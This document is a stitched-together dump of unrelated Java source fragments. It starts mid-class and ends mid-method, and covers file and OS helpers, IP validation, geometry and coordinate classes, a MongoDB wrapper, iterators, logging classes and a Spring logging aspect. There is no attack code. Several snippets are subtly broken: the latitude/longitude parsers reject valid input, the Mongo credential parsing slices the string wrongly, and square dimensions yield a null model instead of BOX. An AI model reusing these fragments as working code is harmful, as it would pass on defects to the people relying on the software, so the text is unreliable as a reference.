     * @param _prefix prefix of the folder
     * @param _length length of random chars
     * @param _timestamp add timestamp (yyyyMMdd_HHmmss-SSS) to directory name
     * @param _deleteOnExit mark directory for deletion on jvm termination
     * @return file
     */
    public static File createTempDirectory(String _path, String _prefix, int _length, boolean _timestamp, boolean _deleteOnExit) {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss-SSS");
        String randomStr = StringUtil.randomString(_length);

        StringBuilder fileName = new StringBuilder();

        if (_prefix != null) {
            fileName.append(_prefix);
        }
        fileName.append(randomStr);

        if (_timestamp) {
            fileName.append("_").append(formatter.format(new Date()));
        }
        File result = createTempDirectory(_path, fileName.toString(), _deleteOnExit);
        while (result == null) {
            result = createTempDirectory(_path, _prefix, _length, _timestamp, _deleteOnExit);
        }
        return result;
    }

    /**
     * Examines some system properties to determine whether the process is likely being debugged
     * in an IDE or remotely.
     * @return true if being debugged, false otherwise
     */
    public static boolean isDebuggingEnabled() {
        boolean debuggingEnabled = false;
        if (ManagementFactory.getRuntimeMXBean().getInputArguments().toString().indexOf("-agentlib:jdwp") > 0) {
            debuggingEnabled = true;
        } else if (ManagementFactory.getRuntimeMXBean().getInputArguments().contains("-Xdebug")) {
            debuggingEnabled = true;
        } else if (System.getProperty("debug", "").equals("true")) {
            debuggingEnabled = true;
        }
        return debuggingEnabled;
    }

    /**
     * Extracts the file extension (part behind last dot of a filename).
     * Only returns the extension, without the leading dot.
     *
     * @param _fileName filename
     * @return extension, empty string if no dot was found in filename or null if given String was null
     */
    public static String getFileExtension(String _fileName) {
        if (_fileName == null) {
            return null;
        }
        int lastDot = _fileName.lastIndexOf('.');
        if (lastDot == -1) {
            return "";
        }
        return _fileName.substring(lastDot + 1);
    }

    /**
     * Extracts the file extension (part behind last dot of a filename).
     * Only returns the extension, without the leading dot.
     *
     * @param _file file
     * @return extension, empty string if no dot was found in filename or null if given String was null
     */
    public static String getFileExtension(File _file) {
        return getFileExtension(_file.getAbsolutePath());
    }

    /**
     * Checks if given String is a valid file, e.g. file exists, is really a file and can be read.
     *
     * Throws IOException or Subclass of it, if file is either non-existing, not a file or unreadable.
     *
     * @param _file filename
     * @return file object, never null
     * @throws IOException if file could not be read
     */
    public static File getFileIfReadable(String _file) throws IOException {
        if (StringUtil.isBlank(_file)) {
            throw new IOException("Empty or null string is not a valid file");
        }

        File file = new File(_file);

        if (!file.exists()) {
            throw new FileNotFoundException("No such file: " + _file);
        } else if (!file.isFile()) {
            throw new IOException("Not a file: " + _file);
        } else if (!file.canRead()) {
            throw new AccessDeniedException("File not readable: " + _file);
        }

        return file;
    }

    /**
     * Formats a file size given in byte to something human readable.
     *
     * @param _bytes size in bytes
     * @param _use1000BytesPerMb use 1000 bytes per MByte instead of 1024
     * @return String
     */
    public static String formatBytesHumanReadable(long _bytes, boolean _use1000BytesPerMb) {
        int unit = _use1000BytesPerMb ? 1000 : 1024;
        if (_bytes < unit)  {
            return _bytes + " B";
        }
        int exp = (int) (Math.log(_bytes) / Math.log(unit));
        String pre = (_use1000BytesPerMb ? "kMGTPE" : "KMGTPE").charAt(exp-1) + (_use1000BytesPerMb ? "" : "i");
        return String.format("%.1f %sB", _bytes / Math.pow(unit, exp), pre);
    }

    /**
     * Read the JARs manifest and try to get the current program version from it.
     * @param _class class to use as entry point
     * @param _default default string to use if version could not be found
     * @return version or null
     */
    public static String getApplicationVersionFromJar(Class<?> _class, String _default) {
        try {
            Enumeration<URL> resources = _class.getClassLoader().getResources("META-INF/MANIFEST.MF");
            while (resources.hasMoreElements()) {

                Manifest manifest = new Manifest(resources.nextElement().openStream());
                Attributes attribs = manifest.getMainAttributes();
                String ver = attribs.getValue(Attributes.Name.IMPLEMENTATION_VERSION);
                if (ver == null) {
                	return _default;
                }

                String rev = attribs.getValue("Implementation-Revision");
                if (rev != null) {
                    ver += "-r" + rev;
                }
                return ver;

            }
        } catch (IOException _ex) {
        }

        return _default;
    }

    /**
     * Tries to find the "default" terminal emulator.
     * This will be cmd.exe on windows and may vary on linux/unix systems depending on installed terminal programs.
     * On linux/unix there is no generic way to find the default terminal,
     * so all known terminal programs will be tried until any of them is found.
     * @return String with terminal name or null if terminal could not be determined
     */
    public static String guessDefaultTerminal() {
        if (System.getProperty("os.name", "").equalsIgnoreCase("windows")) {
            return "cmd.exe";
        }

        String envPath = System.getenv("PATH");
        if (envPath == null) {
            throw new RuntimeException("Could not find enviroment PATH setting.");
        }
        String[] pathes = envPath.split(":");

        for (String term : TERMINAL_EMULATORS) {
            for (String path : pathes) {
                File terminalExe = new File(concatFilePath(path, term));
                if (terminalExe.exists() && terminalExe.canExecute()) {
                    return terminalExe.getAbsolutePath();
                }
            }
        }

        return null;
    }

    /**
     * Normalize a file system path expression for the current OS.
     * Replaces path separators by this OS's path separator.
     * Appends a final path separator if parameter is set
     * and if not yet present.
     * @param _path path
     * @param _appendFinalSeparator controls appendix of separator at the end
     * @return normalized path
     */
    public static String normalizePath(String _path, boolean _appendFinalSeparator) {
        if (_path == null) {
            return _path;
        }

        String path = _path
            .replace("\\", FILE_SEPARATOR)
            .replace("/", FILE_SEPARATOR);
        if (_appendFinalSeparator && !path.endsWith(FILE_SEPARATOR)) {
            path += FILE_SEPARATOR;
        }
        return path;
    }

    /**
     * Normalize a file system path expression for the current OS.
     * Replaces path separators by this OS's path separator.
     * Appends a final path separator unless present.
     * @param _path path
     * @return normalized path
     */
    public static String normalizePath(String _path) {
        return normalizePath(_path, true);
    }

    /**
     * Checks if the running OS is a MacOS/MacOS X.
     * @return true if MacOS (or MacOS X), false otherwise
     */
    public static boolean isMacOs() {
        String osName = System.getProperty("os.name");
        return osName == null ? false : osName.toLowerCase().startsWith("mac");
    }

    /**
     * Tries to get the current version of MacOS/MacOS X.
     * The version usually looks like '10.13.4', where the part behind the last dot represents the patchlevel.
     * The major version in this case would be '10.13'.
     * @return version without patchlevel or null
     */
    public static String getMacOsMajorVersion() {
        if (!isMacOs()) {
            return null;
        }

        String osVersion = System.getProperty("os.version");

        if (osVersion != null) {
            String[] split = osVersion.split("\\.");
            if (split.length >= 2) {
                return split[0] + "." + split[1];
            } else {
                return osVersion;
            }
        }

        return null;
    }
}
--------------------------------------------------------------------------------------------------------
@Description("Detects @Dekorate and configures application based on the specified configuration files.")
@SupportedAnnotationTypes({"io.dekorate.annotation.Dekorate"})
@SupportedSourceVersion(SourceVersion.RELEASE_8)
--------------------------------------------------------------------------------------------------------

import java.net.InetAddress;
import java.util.regex.Pattern;

public final class NetUtil {

    private static final Pattern IPV4_PATTERN = Pattern.compile("(([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\.){3}([01]?\\d\\d?|2[0-4]\\d|25[0-5])", Pattern.CASE_INSENSITIVE);
    private static final Pattern IPV6_PATTERN = Pattern.compile("([0-9a-f]{1,4}:){7}([0-9a-f]){1,4}", Pattern.CASE_INSENSITIVE);

    private NetUtil() {

    }

    /**
     * Get the host name of a local address, if available.
     *
     * @param _ipAddress the IP address
     * @return the host name, or the original IP if name not available
     */
    public static String getHostName(String _ipAddress) {
        try {
            InetAddress addr = InetAddress.getByName(_ipAddress);
            return addr.getHostName();
        } catch (Exception _ex) {
            return _ipAddress;
        }
    }

    /**
     * Checks if given String is an IPv4 address.
     *
     * @param _ipAddress
     * @return true if valid address, false otherwise
     */
    public static boolean isIPv4Address(String _ipAddress) {
        return IPV4_PATTERN.matcher(_ipAddress).matches();
    }

    /**
     * Checks if given String is an IPv6 address.
     *
     * @param _ipAddress
     * @return true if valid address, false otherwise
     */
    public static boolean isIPv6Address(String _ipAddress) {
        return IPV6_PATTERN.matcher(_ipAddress).matches();
    }

    /**
     * Checks if given String is either a valid IPv4 or IPv6 address.
     *
     * @param _ipAddress
     * @return true if valid address, false otherwise
     */
    public static boolean isIPv4orIPv6Address(String _ipAddress) {
        return IPV4_PATTERN.matcher(_ipAddress).matches() || IPV6_PATTERN.matcher(_ipAddress).matches();
    }

}
--------------------------------------------------------------------------------------------------------
import java.math.BigDecimal;
import java.math.RoundingMode;

public class WidthHeight {

	public enum EModel {
		
		BOX, PORTRAIT, LANDSCAPE;

		public static EModel get(int inWidth, int inHeight) {
			
			if ( inWidth > inHeight ) { return LANDSCAPE; }
			else if ( inWidth < inHeight ) { return PORTRAIT; }
			return null;
		}

		public boolean isLandscape() {
			
			return this == LANDSCAPE;
		}
		
		public boolean isPortrait() {
			
			return this == PORTRAIT;
		}
		
		public boolean isBox() {
			
			return this == BOX;
		}
		
	}
	
	private int width, height;
	private EModel model;
	
	public WidthHeight(int inWidth, int inHeight) {
		
		setWidthHeight( inWidth, inHeight );
	}

	public WidthHeight(String inWidthXHeight) {
		
		int w = 0, h = 0;
		
		try {
			
			inWidthXHeight = inWidthXHeight.toLowerCase();
			String[] wh = inWidthXHeight.split( "x" , -1);
			if (wh.length != 2) { wh = null; } 
			w = Integer.parseInt( wh[0].trim() );
			h = Integer.parseInt( wh[1].trim() );
			
		} catch (Exception e) {
			
			throw new IllegalArgumentException("cannot parse 'width x height': "+ inWidthXHeight);
		}
		
		setWidthHeight(w,h);
	}

	public void setWidthHeight(int inWidth, int inHeight) {
		
		if ( inWidth <= 0 ) {
			
			throw new IllegalArgumentException("width must be > 0 [width="+ inWidth +", height="+ inHeight +"]");
		
		} else if ( inHeight <= 0 ) {
			
			throw new IllegalArgumentException("height must be > 0 [width="+ inWidth +", height="+ inHeight +"]");
		}
		
		this.width = inWidth;
		this.height = inHeight;
		model = EModel.get( width, height );
	}

	public int getWidth() {
		return width;
	}

	public void setWidth(int inWidth) {
		
		if ( inWidth <= 0 ) {
			
			throw new IllegalArgumentException("width must be > 0 [width="+ inWidth +", height="+ height +"]");
		}
		
		this.width = inWidth;
		model = EModel.get( width, height );
	}

	public int getHeight() {
		return height;
	}

	public void setHeight(int inHeight) {
		if ( inHeight <= 0 ) {
			
			throw new IllegalArgumentException("height must be > 0 [width="+ width +", height="+ inHeight +"]");
		}
		this.height = inHeight;
		model = EModel.get( width, inHeight );
	}

	public EModel getModel() {
		return model;
	}
	
	/**
	 * @param inScale how scale/significant the result will be. defaults to 2
	 * @return the division of width/height
	 */
	public double getAspectratio(Integer inScale) {
		
		if ( EModel.BOX == model ) { return 1.0; }
		
		inScale = inScale == null || inScale < 0 ? 2 : inScale; 
		
		return new BigDecimal( width ).divide( new BigDecimal( height ) , inScale+3 , RoundingMode.HALF_UP).setScale(inScale, RoundingMode.HALF_UP).doubleValue();
	}
	
	public double getAspectratio() {
		return getAspectratio( 2 );
	}
	
	@Override
	public String toString() {
		return "WidthHeight [width=" + width + ", height=" + height + ", model=" + model + ", aspectratio="+ getAspectratio() +"]";
	}

	public static void main(String[] args) {
		
		System.out.println( new WidthHeight(1024, 756) );
		System.out.println( new WidthHeight(756, 1024) );
		System.out.println( new WidthHeight(500, 300) );
		System.out.println( new WidthHeight(300,500) );
		System.out.println( new WidthHeight(1000, 500) );
		System.out.println( new WidthHeight(500,1000) );
		System.out.println( new WidthHeight(333,333) );
		System.out.println( new WidthHeight(-333,0) );
		
	}
	
}
--------------------------------------------------------------------------------------------------------

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

public class MapBuilder<K, V> {

	private Map<K, V> map;

	public MapBuilder() {

		this(1);
	}

	public MapBuilder(int inSize) {

		this(new HashMap<K, V>(inSize < 1 ? 1 : inSize));
	}

	public MapBuilder(Map<K, V> inMap) {

		if (inMap == null) {

			throw new IllegalArgumentException("map must not be null");
		}

		map = inMap;
	}

	public MapBuilder(K inKey, V inValue) {

		this();
		put(inKey, inValue);
	}

	public static <K, V> MapBuilder<K, V> create(K inKey, V inValue) {

		return new MapBuilder<K, V>(inKey, inValue);
	}

	public static <K, V> Map<K, V> build(K inKey, V inValue) {

		return new MapBuilder<K, V>(inKey, inValue).map;
	}

	public MapBuilder<K, V> put(K inKey, V inValue) {

		map.put(inKey, inValue);
		return this;
	}

	public MapBuilder<K, V> remove(K inKey) {

		map.remove(inKey);
		return this;
	}

	public Set<Map.Entry<K, V>> getEntries() {

		return map.entrySet();
	}

	public Map<K, V> get() {

		return map;
	}
	
	/**
	 * @param inModifiable whether to build an unmodifyable map
	 * @return the newly created {@link Map}
	 */
	public Map<K, V> get(boolean inModifiable) {
		return inModifiable ? map : Collections.unmodifiableMap( map );
	}
	
	public Set<K> getKeys() {

		return map.keySet();
	}

	public Set<V> getValues() {

		return (Set<V>) map.values();
	}
}
--------------------------------------------------------------------------------------------------------
/**
 * Mongo: lon,lat
 * google: lat,lon
 * @author greyshine
 *
 */
public class LatitudeLongitude {

	public static final Pattern REGEX = Pattern.compile("\\-?[0-9]+(\\.[0-9]+)?\\,\\-?[0-9]+(\\.[0-9]+)?");

	private String lat, lon;

	public LatitudeLongitude() {

		lat = lon = "0.000000";
	}

	public LatitudeLongitude(String lat, String lon) {

		setLat(lat);
		setLon(lon);
	}

	public LatitudeLongitude(double lat, double lon) {

		setLat(lat);
		setLon(lon);
	}

	public LatitudeLongitude(String inLatCommaLng) {

		final String[] theValues = Utils.trimToEmpty(inLatCommaLng).split(",");

		if (theValues == null || theValues.length != 2 || !Utils.isParseableDouble(theValues[0].trim()) || !Utils.isParseableDouble(theValues[1].trim())) {

			throw new IllegalArgumentException("bad latitude,longitude: " + inLatCommaLng);
		}

		setLat(theValues[0].trim());
		setLon(theValues[1].trim());
	}

	public void setLat(String lat) {

		final BigDecimal theLat = Utils.parseBigDecimal(lat);

		if (theLat == null) {
			throw new IllegalArgumentException("bad latitude: " + lat);
		}

		setLat(theLat);
	}

	public void setLat(double inLatitude) {

		setLat(new BigDecimal(inLatitude));
	}

	public void setLat(BigDecimal inBd) {

		lat = normalizeLatitude( inBd ).toPlainString();
	}

	public void setLon(String lon) {

		final BigDecimal theLon = Utils.parseBigDecimal(lon);

		if (theLon == null) {
			throw new IllegalArgumentException("bad longitude: " + lat);
		}

		setLon(theLon);
	}
	public void setLon(double inLongitude) {

		setLon(new BigDecimal(inLongitude));
	}

	public void setLon(BigDecimal inBd) {

		lon = normalizeLongitude(inBd).toPlainString();
	}
	
	public String getLat() {
		return lat;
	}

	public String getLon() {
		return lon;
	}

	public static LatitudeLongitude parseLatLon(String inValue) {

		if (Utils.isMatch(inValue, REGEX)) {
			throw new IllegalArgumentException("Cannot parse: " + inValue);
		}

		try {
			final int cidx = inValue.indexOf(',');
			return new LatitudeLongitude(inValue.substring(0, cidx).trim(), inValue.substring(cidx + 1).trim());
		} catch (final Exception e) {
			throw new IllegalArgumentException("Cannot parse: " + inValue);
		}
	}

	public static LatitudeLongitude parseLonLat(String inValue) {

		if (Utils.isMatch(inValue, REGEX)) {
			throw new IllegalArgumentException("Cannot parse: " + inValue);
		}

		try {
			final int cidx = inValue.indexOf(',');
			return new LatitudeLongitude(inValue.substring(cidx + 1).trim(), inValue.substring(0, cidx).trim());
		} catch (final Exception e) {
			throw new IllegalArgumentException("Cannot parse: " + inValue);
		}
	}

	public double[] toLatLonDoubles() {

		return new double[] { getLatitude(), getLongitude() };
	}

	public double[] toLonLatDoubles() {

		return new double[] { getLongitude(), getLatitude() };
	}
	
	public static double normalizeLatitude(double inLat) {
		
		return normalizeLatitude( new BigDecimal( inLat ) ).doubleValue();
	}
	
	public static double normalizeLongitude(double inLat) {
		
		return normalizeLongitude( new BigDecimal( inLat ) ).doubleValue();
	}
	
	public static BigDecimal normalizeLatitude(BigDecimal inLat) {
		
		if (inLat == null) {
			throw new IllegalArgumentException();
		}
		
		while (Utils.isLess(Utils.BD_m90, inLat)) {

			inLat = inLat.add(Utils.BD_180);
		}

		while (Utils.isLarger(Utils.BD_90, inLat)) {

			inLat = inLat.subtract(Utils.BD_180);
		}

		return inLat.setScale(6, RoundingMode.HALF_UP);
	}
	
	public static BigDecimal normalizeLongitude(BigDecimal inLon) {
		
		if (inLon == null) {
			throw new IllegalArgumentException();
		}
		
		while (Utils.isLess(Utils.BD_m180, inLon)) {

			inLon = inLon.add(Utils.BD_360);
		}

		while (Utils.isLarger(Utils.BD_180, inLon)) {

			inLon = inLon.subtract(Utils.BD_360);
		}

		return inLon.setScale(6, RoundingMode.HALF_UP);
	}

	public double getLongitude() {
		return Double.parseDouble(lon);
	}

	public double getLatitude() {
		return Double.parseDouble(lat);
	}

	public String toLatLonString() {
		return lat + "," + lon;
	}

	public String toLonLatString() {
		return lon + "," + lat;
	}

	@Override
	public String toString() {
		return "LatitudeLongitude [lat=" + lat + ", lon=" + lon + "]";
	}
}
--------------------------------------------------------------------------------------------------------

import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

import com.mongodb.MongoClient;
import com.mongodb.MongoCredential;
import com.mongodb.ServerAddress;

public class MongoUnit {

	private static final List<MongoCredential> EMPTY_CREDENTIALS = Collections.unmodifiableList(new ArrayList<MongoCredential>(0));

	public final String unitname;
	// default DB
	public final String defaultDbName;
	private final MongoClient mongoClient;

	public MongoUnit(String inPropertiesKey, String inPropertiesValue) throws UnknownHostException {

		// load mongo client
		int idx = inPropertiesKey.indexOf('.');
		unitname = idx < 1 ? null : inPropertiesKey.substring(0, idx);

		if (!".address".equalsIgnoreCase(inPropertiesKey.substring(idx))) {

			mongoClient = null;
			defaultDbName = null;
			return;
		}

		String theUser = null;
		String thePassword = null;
		idx = inPropertiesValue.indexOf('@');

		if (idx > 2) {

			theUser = inPropertiesValue.substring(idx);
			inPropertiesValue = inPropertiesValue.substring(idx + 1);

			idx = theUser.indexOf(':');

			if (idx < 1) {
				theUser = null;
			} else {
				thePassword = Utils.trimToNull(theUser.substring(idx + 1));
				theUser = Utils.trimToNull(theUser.substring(idx));
			}
		}

		idx = inPropertiesValue.indexOf('/');
		defaultDbName = idx < 0 ? null : Utils.trimToNull(inPropertiesValue.substring(idx + 1));

		inPropertiesValue = idx < 0 ? inPropertiesValue : inPropertiesValue.substring(0, idx);

		// TODO add support to several addresses

		idx = inPropertiesValue.indexOf(':');

		final String address = idx < 0 ? null : Utils.trimToNull(inPropertiesValue.substring(0, idx));
		final Integer port = idx < 0 ? null : de.greyshine.utils.Utils.parseInteger(inPropertiesValue.substring(idx + 1));

		mongoClient = new MongoClient(Arrays.asList(new ServerAddress(address, port)), theUser == null || thePassword == null ? EMPTY_CREDENTIALS : Arrays.asList(MongoCredential.createPlainCredential(theUser, "$EXTERNAL", thePassword.toCharArray())));
	}

	public MongoClient getMongoClient() {
		return mongoClient;
	}

	public void close() {

		getMongoClient().close();
	}

	public boolean isValid() {
		return getMongoClient() != null;
	}

	@Override
	public String toString() {
		return "MongoUnit [unitname=" + unitname + ", defaultDbName=" + defaultDbName + ", mongoClient=" + getMongoClient() + "]";
	}

--------------------------------------------------------------------------------------------------------
import java.util.Iterator;

public class FilterIter<T> implements Iterable<T>, Iterator<T> {

	private Iterator<T> iterator;
	private final IIterFilter<T>[] filters;
	private boolean hasNext;
	private T next;
	
	public FilterIter( Iterable<T> inIterable, IIterFilter<T>... inFilters ) {
		
		this( inIterable == null ? null : inIterable.iterator(), inFilters );
	}
	
	@SuppressWarnings("unchecked")
	public FilterIter(Iterator<T> inIterator, final IIterFilter<T>... inFilters) {
		
		iterator = inIterator == null ? Utils.ITERATOR_NONE : inIterator;
		filters = inFilters == null ? new IIterFilter[0] : inFilters;
		
		scanNext();
	}

	private void scanNext() {
		
		All:
		while( iterator.hasNext() ) {
			
			T theNextCandidate = iterator.next();
			
			for (IIterFilter<T> aFilter : filters) {
				
				if ( aFilter != null && !aFilter.is(theNextCandidate) ) {
			
					continue All;
				}
			}
			
			next = theNextCandidate;
			hasNext = true;
			return;
		}
		
		hasNext = false;
		next = null;
	}

	@Override
	public Iterator<T> iterator() {
		return this;
	}

	@Override
	public boolean hasNext() {
		return hasNext;
	}

	@Override
	public T next() {
		
		if ( !hasNext ) { throw new IllegalStateException("no more elements"); }
		
		final T theNext = next;
		scanNext();
		return theNext;
	}
	
	public static interface IIterFilter<T> {
		boolean is(T inItem);
	}
	
	public static class OffsetIterFilter<T> implements IIterFilter<T> {

		private Long skips;
		
		public OffsetIterFilter(Long inOffset) {
			
			skips = inOffset;
		}
		
		@Override
		public boolean is(T inItem) {
			
			if ( skips == null || skips == 0 ) { return true; }
			else if ( skips < 0 ) { return false; }
			
			skips--;
			
			return false;
		}
	}
	
	public static class LengthIterFilter<T> implements IIterFilter<T> {

		private Long left;
		
		public LengthIterFilter(Long inLength) {
			
			left = inLength;
		}
		
		@Override
		public boolean is(T inItem) {
			
			if ( left == null ) { return true; }
			else if ( left <= 0 ) { return false; }
			
			left--;
			
			return true;
		}
	}
	
	@SuppressWarnings("unchecked")
	public static <T> Iterable<T> createOffsetLengthIterable(Iterator<T> inIterator, Long inOffset, Long inSize) {
		
		return new FilterIter<T>(inIterator, new OffsetIterFilter<T>( inOffset ), new LengthIterFilter<T>( inSize ));
	};

}
--------------------------------------------------------------------------------------------------------
/**
 * Created by herman on 21/2/2016.
 */
@SuppressWarnings({"unused", "WeakerAccess"})
public class NullLog extends AbstractLog {

    public static class Factory implements LogFactory {
        @Override
        public L newLog(String tag) {
            return new NullLog(tag);
        }
    }

    public NullLog(String tag) {
        super(tag);
    }

    @Override
    public void d(String tag, String msg) {

    }

    @Override
    public void w(String tag, String msg) {

    }

    @Override
    public void i(String tag, String msg) {

    }

    @Override
    public void e(String tag, String msg) {

    }

    @Override
    public void e(String tag, String msg, Throwable t) {

    }
}

/**
 * Created by hermanc on 23/8/16.
 */
@SuppressWarnings({"unused", "WeakerAccess"})
public class CompositeLog extends AbstractLog {

    private L[] logs;

    public static class Factory implements LogFactory {

        private LogFactory[] factories;

        public Factory(LogFactory... factories) {
            this.factories = factories;
        }

        @Override
        public L newLog(String tag) {

            L[] l = new L[factories.length];

            for(int i=0;i<factories.length;i++) {
                l[i] = factories[i].newLog(tag);
            }

            return new CompositeLog(tag, l);
        }


    }

    public CompositeLog(String tag, L[] logs) {
        super(tag);
        this.logs = logs;
    }

    @Override
    public void d(String tag, String msg) {
        for(L l : logs) {
            l.d(tag, msg);
        }
    }

    @Override
    public void w(String tag, String msg) {
        for(L l : logs) {
            l.w(tag, msg);
        }
    }

    @Override
    public void i(String tag, String msg) {
        for(L l : logs) {
            l.i(tag, msg);
        }
    }

    @Override
    public void e(String tag, String msg) {
        for(L l : logs) {
            l.e(tag, msg);
        }
    }

    @Override
    public void e(String tag, String msg, Throwable t) {
        for(L l : logs) {
            l.e(tag, msg, t);
        }
    }
}
--------------------------------------------------------------------------------------------------------import java.lang.annotation.Annotation;

import javax.annotation.Nonnull;
import javax.annotation.Nullable;

import io.github.logger.controller.annotation.NoLogging;
import io.github.logger.controller.utils.JsonUtil;
import io.github.logger.controller.utils.RequestUtil;
import org.apache.commons.lang3.time.StopWatch;
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.AfterThrowing;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Pointcut;
import org.aspectj.lang.reflect.MethodSignature;
import org.slf4j.Logger;
import org.springframework.core.io.ByteArrayResource;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.multipart.MultipartFile;

import io.github.logger.controller.annotation.Logging;

//@formatter:off
/**
 * This class is responsible for performing logging on Controller methods.
 * It used Spring AspectJ (not native Spring CGLib AOP) for weaving logging logic into matching controller methods.
 *
 * <p>This aspect uses two annotations - {@link Logging} and {@link NoLogging} to gain fine-grain control over
 * method logging behavior.
 *
 * @see <a href="http://docs.spring.io/spring/docs/current/spring-framework-reference/html/aop.html">
 *          Spring Documentation on Aspect Oriented Programming with Spring
 *      </a>
 */
//@formatter:on

@Aspect
public class GenericControllerAspect implements ControllerAspect {

    private static final Logger LOG = org.slf4j.LoggerFactory.getLogger(GenericControllerAspect.class);

    @Pointcut("@annotation(io.github.logger.controller.annotation.Logging) " +
            "|| @target(io.github.logger.controller.annotation.Logging)")
    public void methodOrClassLoggingEnabledPointcut() {
    }

    @Pointcut("!@annotation(io.github.logger.controller.annotation.NoLogging)")
    public void methodLoggingNotDisabledPointcut() {
    }

    @Pointcut("within(@org.springframework.web.bind.annotation.RestController *) ||" +
            "within(@org.springframework.stereotype.Controller *)")
    public void allPublicControllerMethodsPointcut() {
    }

    @Around("allPublicControllerMethodsPointcut() "
            + "&& methodLoggingNotDisabledPointcut() "
            + "&& methodOrClassLoggingEnabledPointcut()")
    @Nullable
    public Object log(@Nonnull ProceedingJoinPoint proceedingJoinPoint) throws Throwable {
        Object result = null;
        String returnType = null;
        RequestMapping methodRequestMapping = null;
        RequestMapping classRequestMapping = null;

        try {
            MethodSignature methodSignature = (MethodSignature)proceedingJoinPoint.getSignature();
            methodRequestMapping = methodSignature.getMethod().getAnnotation(RequestMapping.class);
            classRequestMapping = proceedingJoinPoint.getTarget().getClass().getAnnotation(RequestMapping.class);

            // this is required to distinguish between a returned value of null and no return value, as in case of
            // void return type.
            returnType = methodSignature.getReturnType().getName();

            logPreExecutionData(proceedingJoinPoint, methodRequestMapping);
        } catch (Exception e) {
            LOG.error("Exception occurred in pre-proceed logic", e);
        }

        StopWatch timer = new StopWatch();
        try {
            timer.start();
            result = proceedingJoinPoint.proceed();
        } finally {
            timer.stop();
            if (returnType != null) {
                logPostExecutionData(
                        proceedingJoinPoint, timer, result, returnType, methodRequestMapping, classRequestMapping
                );
            }
        }

        return result;
    }

    public void logPreExecutionData(
            @Nonnull ProceedingJoinPoint proceedingJoinPoint,
            @Nullable RequestMapping methodRequestMapping) {
        MethodSignature methodSignature = (MethodSignature)proceedingJoinPoint.getSignature();

        String methodName = methodSignature.getName() + "()";
        Object argValues[] = proceedingJoinPoint.getArgs();
        String argNames[] = methodSignature.getParameterNames();
        String requestContext = RequestUtil.getRequestContext().toString();
        Annotation annotations[][] = methodSignature.getMethod().getParameterAnnotations();

        StringBuilder preMessage = new StringBuilder().append(methodName);

        if (argValues.length > 0) {
            logFunctionArguments(argNames, argValues, preMessage, annotations, methodRequestMapping);
        }

        preMessage.append(" called via ").append(requestContext);
        LOG.info(preMessage.toString());
    }

    public void logPostExecutionData(
            @Nonnull ProceedingJoinPoint proceedingJoinPoint,
            @Nonnull StopWatch timer,
            @Nullable Object result,
            @Nonnull String returnType,
            @Nullable RequestMapping methodRequestMapping,
            @Nullable RequestMapping classRequestMapping) {
        MethodSignature methodSignature = (MethodSignature)proceedingJoinPoint.getSignature();
        String methodName = methodSignature.getName() + "()";

        LOG.info(methodName + " took [" + timer.getTime() + " ms] to complete");

        if (LOG.isDebugEnabled()) {
            boolean needsSerialization = false;

            String produces[] = methodRequestMapping != null ? methodRequestMapping.produces() : new String[0];
            for (String produce : produces) {
                if (produce.equals(MediaType.APPLICATION_JSON_VALUE)) {
                    needsSerialization = true;
                    break;
                }
            }

            if (!needsSerialization) {
                produces = classRequestMapping != null ? classRequestMapping.produces() : new String[0];
                for (String produce : produces) {
                    if (produce.equals(MediaType.APPLICATION_JSON_VALUE)) {
                        needsSerialization = true;
                        break;
                    }
                }
            }

            StringBuilder postMessage = new StringBuilder().append(methodName).append(" returned: [");

            if (needsSerialization) {
                String resultClassName = result == null ? "null" : result.getClass().getName();
                resultClassName = returnType.equals("void") ? returnType : resultClassName;
                serialize(result, resultClassName, postMessage);
            } else {
                postMessage.append(result);
            }
            postMessage.append("]");
            LOG.debug(postMessage.toString());
        }
    }

    @AfterThrowing(
            pointcut = "allPublicControllerMethodsPointcut() && "
                    + "methodLoggingNotDisabledPointcut() && "
                    + "methodOrClassLoggingEnabledPointcut()",
            throwing = "t")
    public void onException(@Nonnull JoinPoint joinPoint, @Nonnull Throwable t) {
        String methodName = joinPoint.getSignature().getName() + "()";
        LOG.info(methodName + " threw exception: [" + t + "]");
    }

    public void serialize(@Nullable Object object, @Nonnull String objClassName, @Nonnull StringBuilder logMessage) {
        boolean serializedSuccessfully = false;
        Exception exception = null;

        // this is to distinguish between methods returning null value and methods returning void.
        // Object arg is null in both cases but objClassName is not.
        if (objClassName.toLowerCase().equals("void")) {
            logMessage.append(objClassName);
            serializedSuccessfully = true;
        }

        // try serializing assuming a perfectly serializable object.
        if (!serializedSuccessfully) {
            try {
                logMessage.append(JsonUtil.toJson(object));
                serializedSuccessfully = true;
            } catch (Exception e) {
                exception = e;
            }
        }

        // detect if its a mock object.
        if (!serializedSuccessfully && objClassName.toLowerCase().contains("mock")) {
            logMessage.append("Mock Object");
            serializedSuccessfully = true;
        }

        // try getting file size assuming object is a file type object
        if (!serializedSuccessfully) {
            long fileSize = -1;

            if (object instanceof ByteArrayResource) {
                fileSize = ((ByteArrayResource)object).contentLength();
            } else if (object instanceof MultipartFile) {
                fileSize = ((MultipartFile)object).getSize();
            }

            if (fileSize != -1) {
                logMessage.append("file of size:[").append(fileSize).append(" B]");
                serializedSuccessfully = true;
            }
        }

        if (!serializedSuccessfully) {
            LOG.warn("Unable to serialize object of type [{}] for logging", objClassName, exception);
        }
    }

    /**
     * Generated name-value pair of method's formal arguments. Appends the generated string in provided StringBuilder
     *
     * @param argNames String[] containing method's formal argument names Order of names must correspond to order on arg
     *            values in argValues.
     * @param argValues String[] containing method's formal argument values. Order of values must correspond to order on
     *            arg names in argNames.
     * @param stringBuilder the StringBuilder to append argument data to.
     */
    private void logFunctionArguments(
            @Nonnull String[] argNames,
            @Nonnull Object[] argValues,
            @Nonnull StringBuilder stringBuilder,
            @Nonnull Annotation annotations[][],
            @Nullable RequestMapping methodRequestMapping) {
        boolean someArgNeedsSerialization = false;

        if (methodRequestMapping != null) {
            for (String consumes : methodRequestMapping.consumes()) {
